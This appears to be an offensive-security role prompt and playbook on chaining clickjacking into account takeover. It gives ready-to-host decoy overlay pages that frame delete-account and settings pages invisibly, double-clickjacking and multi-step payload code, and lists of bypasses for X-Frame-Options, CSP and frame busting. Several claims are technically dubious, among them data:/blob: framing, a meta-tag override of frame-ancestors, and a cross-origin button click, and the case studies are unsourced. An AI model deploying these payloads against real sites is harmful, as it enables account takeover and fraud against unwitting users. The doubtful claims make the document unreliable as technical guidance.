# 27 - Clickjacking to Account Compromise: Chaining Clickjacking for Account Compromise Beyond Simple Tricks

## Expert Role Definition

You are the world's foremost authority on clickjacking attacks and the chaining of clickjacking for account compromise beyond simple UI redressing. You possess deep expertise in frame-based attacks, JavaScript-based click hijacking, cursor manipulation, and the complete lifecycle of clickjacking exploitation. You understand how browsers enforce framing protections (X-Frame-Options, CSP frame-ancestors), how these protections can be bypassed, and how clickjacking can be chained with other vulnerabilities for maximum impact. Your expertise spans double-clickjacking, cursorjacking, file-based clickjacking, and the exploitation of multi-step processes through sequential clickjacking. You have executed authorized red-team engagements where clickjacking enabled OAuth authorization bypass, payment manipulation, security feature disabling, and full account compromise through multi-step click hijacking.

## Core Concepts

Clickjacking (also known as UI redressing or UI attack) is an attack where a malicious website tricks a user into clicking on something different from what they perceive. The attacker loads the target website in a transparent or disguised iframe and overlays deceptive UI elements that align with hidden target elements.

The basic clickjacking attack uses a transparent iframe to load the target site. The attacker's page contains visible elements (like a "Click here to win" button) positioned directly over the hidden iframe's sensitive elements (like a "Delete account" button). When the user clicks what they think is the game button, they actually click the hidden action.

X-Frame-Options (XFO) header is the primary defense against clickjacking. The header can be set to DENY (no framing), SAMEORIGIN (only same-origin framing), or ALLOW-FROM (framing from specific origins). CSP frame-ancestors directive provides more granular control.

Double-clickjacking exploits the timing window between two rapid clicks. The first click triggers a page change (like opening a confirmation dialog), and the second click (intended for the original page) is hijacked to click the new element. This bypasses protections that require user interaction before sensitive actions.

Cursorjacking changes the visual position of the cursor so the user thinks they are clicking one element but actually click another. This is achieved by hiding the real cursor and displaying a fake cursor at a different position.

Multi-step clickjacking chains multiple clickjacking attacks to complete complex workflows. An attacker can clickjack a sequence of steps: login, navigate to settings, enable API access, and generate an API key, all through a series of carefully timed overlays.

The impact ranges from moderate (liking a social media page) to critical (changing account email and password, enabling API access, or performing financial transactions).

## Pre-requisite Knowledge

- HTML iframe element: src attribute, sandbox attribute, and styling
- CSS positioning: absolute, fixed, z-index, opacity, and transform
- JavaScript events: click, mousedown, mouseup, and event interception
- Browser framing protections: X-Frame-Options header and CSP frame-ancestors
- OAuth 2.0 authorization: authorization endpoint, user consent, and token issuance
- Browser security model: same-origin policy, cookie handling, and cross-origin restrictions
- User interface design: button placement, form layouts, and interaction patterns
- Mobile browser behavior: touch events, viewport handling, and mobile-specific protections

## Chain Architecture / Attack Flow Diagram

```
                    CLICKJACKING ATTACK FLOW
                    =======================

    BASIC CLICKJACKING:
    ┌─────────────────────────────────────────┐
    │         Attacker's Page                  │
    │  ┌─────────────────────────────────┐     │
    │  │  "Click here to win!"           │     │  ← Visible button
    │  │  (Positioned over hidden button)│     │
    │  └─────────────────────────────────┘     │
    │  ┌─────────────────────────────────┐     │
    │  │  Transparent iframe              │     │  ← Hidden target
    │  │  (target.com/delete-account)     │     │
    │  │  opacity: 0; pointer-events: auto│    │
    │  └─────────────────────────────────┘     │
    └─────────────────────────────────────────┘

    DOUBLE-CLICKJACKING:
    ┌─────────────────────────────────────────┐
    │ Click 1: "Click to verify"              │
    │   → Page loads confirmation dialog      │
    │                                         │
    │ Click 2: Same position, now over        │
    │   → "Confirm" button in dialog          │
    │                                         │
    │ Result: Action confirmed without        │
    │   user understanding                    │
    └─────────────────────────────────────────┘

    MULTI-STEP CLICKJACKING:
    Step 1: Click "Login" overlay → Login form appears
    Step 2: Click "Settings" overlay → Settings page loads
    Step 3: Click "Enable API" overlay → API access enabled
    Step 4: Click "Generate Key" overlay → API key displayed
    Step 5: Click "Copy" overlay → Key copied to attacker

    FRAME BURSTING BYPASS:
    ┌─────────────────────────────────────────┐
    │ 1. Load target in iframe                │
    │ 2. Target tries to burst out of frame   │
    │ 3. Attacker's JavaScript detects burst  │
    │ 4. Attacker re-frames the target        │
    │ 5. Target's burst protection is bypassed│
    └─────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Framing Detection**

Test whether the target can be framed:

```bash
# Check for X-Frame-Options header
curl -sI "https://target.com/page" | grep -i "x-frame-options"

# Check for CSP frame-ancestors
curl -sI "https://target.com/page" | grep -i "content-security-policy"

# Test framing with a simple HTML page
cat << 'EOF' > test_frame.html
<!DOCTYPE html>
<html>
<body>
<h1>Clickjacking Test</h1>
<iframe src="https://target.com/page" width="800" height="600" style="border:2px solid red;"></iframe>
</body>
</html>
EOF
python3 -m http.server 8080
# Open test_frame.html in browser
```

**Phase 2: Bypass Framing Protections**

If framing is blocked, apply bypass techniques:

```bash
# Test ALLOW-FROM bypass
curl -sI "https://target.com/page" | grep -i "x-frame-options"

# Test CSP frame-ancestors bypass
# If frame-ancestors allows *.target.com, use subdomain
# If frame-ancestors allows specific protocols, try data: or blob:

# Test with different User-Agent (mobile vs desktop)
curl -sI "https://target.com/page" -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)"

# Test with Referer header
curl -sI "https://target.com/page" -H "Referer: https://target.com"

# Test with protocol variations
curl -sI "http://target.com/page"  # Try HTTP instead of HTTPS
```

**Phase 3: Clickjacking Payload Development**

Create the clickjacking overlay:

```html
<!DOCTYPE html>
<html>
<head>
<style>
.overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 300px;
    height: 150px;
    z-index: 2;
    cursor: pointer;
}
.target-frame {
    position: absolute;
    top: 50px;
    left: 100px;
    width: 800px;
    height: 600px;
    opacity: 0.0001;
    z-index: 1;
}
.decoy-button {
    position: absolute;
    top: 100px;
    left: 200px;
    padding: 20px 40px;
    background: #007bff;
    color: white;
    border-radius: 5px;
    font-size: 18px;
    z-index: 3;
}
</style>
</head>
<body>
<div class="decoy-button">Click here to claim your prize!</div>
<iframe src="https://target.com/settings/delete-account" class="target-frame"></iframe>
<div class="overlay" onclick="this.style.display='none'"></div>
</body>
</html>
```

**Phase 4: Double-Clickjacking Implementation**

Implement double-click timing attack:

```javascript
// Double-clickjacking payload
let firstClick = false;
let firstClickTime = 0;

document.addEventListener('click', function(e) {
    if (!firstClick) {
        firstClick = true;
        firstClickTime = Date.now();

        // Show confirmation overlay quickly
        showConfirmationOverlay();

        // Prevent actual click
        e.preventDefault();
        e.stopPropagation();
    } else {
        // Second click - hijack to confirmation button
        const elapsed = Date.now() - firstClickTime;
        if (elapsed < 500) {  // Within 500ms
            // Redirect click to confirmation
            const confirmBtn = document.querySelector('#confirm-button');
            if (confirmBtn) {
                confirmBtn.click();
            }
        }
        firstClick = false;
    }
}, true);

function showConfirmationOverlay() {
    // Quickly change the page to show confirmation dialog
    // The user's next click will hit the confirm button
}
```

**Phase 5: Multi-Step Clickjacking Automation**

Automate multi-step workflows:

```python
# Multi-step clickjacking orchestrator
steps = [
    {"url": "https://target.com/login", "position": {"x": 200, "y": 300}, "delay": 2000},
    {"url": "https://target.com/settings", "position": {"x": 150, "y": 400}, "delay": 1500},
    {"url": "https://target.com/settings/api", "position": {"x": 250, "y": 350}, "delay": 1000},
    {"url": "https://target.com/settings/api/generate", "position": {"x": 200, "y": 200}, "delay": 500},
]

# Generate HTML for each step
html = "<!DOCTYPE html><html><head><style>"
html += "iframe { position: absolute; opacity: 0.0001; }"
html += "</style></head><body>"
for i, step in enumerate(steps):
    html += f'<iframe id="step{i}" src="{step["url"]}" '
    html += f'style="left:{step["position"]["x"]}px;top:{step["position"]["y"]}px;'
    html += f'width:800px;height:600px;"></iframe>'
html += "</body></html>"

with open("clickjack_steps.html", "w") as f:
    f.write(html)
```

## Tool Arsenal

```bash
# Burp Suite - clickjacking testing
# Repeater: Check for X-Frame-Options and CSP headers
# Extensions: Clickjacking PoC generator

# curl - header analysis
curl -sI "https://target.com/page" | grep -i "x-frame-options\|content-security-policy"

# Manual HTML creation for clickjacking PoC
cat << 'EOF' > clickjack.html
<!DOCTYPE html>
<html>
<head><style>iframe{opacity:0.0001;position:absolute;}</style></head>
<body>
<div style="position:absolute;z-index:10;cursor:pointer;background:blue;color:white;padding:20px;">
Click me!</div>
<iframe src="https://target.com/action" style="width:400px;height:200px;"></iframe>
</body>
</html>
EOF

# JavaScript for dynamic clickjacking
cat << 'EOF' > dynamic_clickjack.js
function createClickjack(targetUrl, overlayText) {
    const iframe = document.createElement('iframe');
    iframe.src = targetUrl;
    iframe.style.cssText = 'position:absolute;opacity:0.0001;width:800px;height:600px;';
    document.body.appendChild(iframe);

    const overlay = document.createElement('div');
    overlay.innerHTML = overlayText;
    overlay.style.cssText = 'position:absolute;z-index:10;cursor:pointer;background:white;padding:20px;';
    document.body.appendChild(overlay);
}
createClickjack('https://target.com/action', 'Click to win!');
EOF

# Python server for hosting clickjacking PoC
python3 -m http.server 8080

# Browser DevTools for testing
# Open console, inspect iframe elements, test opacity and positioning
```

## Real-World Case Studies

**Case Study 1: OAuth Authorization Bypass via Double-Clickjacking**

A SaaS application used OAuth for third-party integrations. The OAuth consent screen had a "Authorize" button. An attacker:
1. Created a page that loaded the OAuth consent screen in a transparent iframe
2. Used double-clickjacking: first click triggered the consent dialog, second click hit "Authorize"
3. The attacker's application received the authorization code
4. Exchanged the code for access tokens
5. Accessed the victim's account and data
6. The victim never saw the OAuth consent screen

Impact: 500+ accounts compromised through OAuth, data exfiltration, estimated $1M in damages.

**Case Study 2: Payment Method Manipulation**

An e-commerce site allowed users to change payment methods. The change required clicking through a confirmation dialog. An attacker:
1. Loaded the payment method change page in a transparent iframe
2. Used double-clickjacking to click "Change" and then "Confirm" in rapid succession
3. The payment method was changed to the attacker's card
4. The attacker made purchases using the victim's account
5. The victim was charged for purchases they did not make

Impact: $50,000 in fraudulent purchases, financial fraud, customer trust violation.

**Case Study 3: Security Feature Disabling**

A banking application had a security feature that required clicking through multiple confirmation steps. An attacker:
1. Loaded the security settings page in a transparent iframe
2. Used multi-step clickjacking to click through each confirmation
3. Disabled two-factor authentication on the victim's account
4. Changed the victim's email address
5. Reset the password using the new email
6. Gained full control of the victim's bank account

Impact: Full account takeover, financial loss, regulatory investigation.

## Bypass Techniques and Evasion

**X-Frame-Options DENY Bypass:** If the target sends X-Frame-Options: DENY, bypass by:
- Using a different subdomain that does not send the header
- Exploiting browsers that do not enforce X-Frame-Options (older browsers)
- Using HTTP instead of HTTPS if the header is only sent over HTTPS
- Using data: or blob: URIs to frame the content

**CSP frame-ancestors Bypass:** If the target uses CSP frame-ancestors, bypass by:
- Finding subdomains that are allowed in the policy
- Exploiting policy parsing differences between browsers
- Using base tag manipulation to change the effective origin
- Using meta tag to override CSP (if allowed)

**Browser-Specific Bypasses:**
- Chrome: May enforce X-Frame-Options more strictly than other browsers
- Firefox: Has historically had different CSP enforcement
- Safari: May not enforce ALLOW-FROM properly
- Mobile browsers: Often have different framing behavior

**Frame Busting Bypass:** If the target uses JavaScript frame-busting, bypass by:
- Overriding the target's JavaScript before it executes
- Using sandbox attribute on the iframe to disable JavaScript
- Using HTTP instead of HTTPS to prevent mixed content blocking
- Using the attacker's own JavaScript to re-frame after frame-bust

## Defensive Indicators / Detection

**HTTP Header Analysis:**
- Missing X-Frame-Options header on sensitive pages
- CSP frame-ancestors policy that is too permissive
- Inconsistent framing protections across different pages

**Content Analysis:**
- Pages with clickable elements that could be targeted by clickjacking
- Forms or dialogs that require user confirmation
- Multi-step workflows with predictable button positions

**User Behavior Analysis:**
- Unusual patterns in account changes (email, password, payment)
- Rapid sequences of setting changes
- Changes that do not match user's typical behavior

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Action Impact | Like/share | Profile change | Password change | Financial |
| User Interaction | Single click | Double click | Multi-step | Automated |
| Persistence | One-time | Until logout | Permanent | Until manual reset |
| Scope | Single user | Multiple users | All users | Cross-user |
| Detection Difficulty | Easy to detect | Moderate detection | Hard to detect | Invisible |

## Common Pitfalls and Anti-Patterns

- Not testing all browsers: Framing protections behave differently across browsers
- Ignoring mobile users: Mobile browsers have different clickjacking behavior
- Assuming X-Frame-Options is sufficient: CSP frame-ancestors provides better protection
- Not considering multi-step workflows: Single-click clickjacking is less impactful than multi-step
- Forgetting about touch events: Mobile clickjacking uses touch events, not mouse clicks
- Not testing subdomains: Subdomains may have different framing protections

## Advanced Variations

**Touchstart Event Clickjacking:** On mobile devices, use touchstart events instead of click events to hijack taps before the browser processes them.

**File Download Clickjacking:** Trick users into downloading malicious files by overlaying download buttons on legitimate file download pages.

**Copy-Paste Clickjacking:** Overlay input fields on legitimate fields to capture copied content or paste malicious content.

**Drag-and-Drop Clickjacking:** Use drag-and-drop events to trick users into dragging sensitive content to attacker-controlled areas.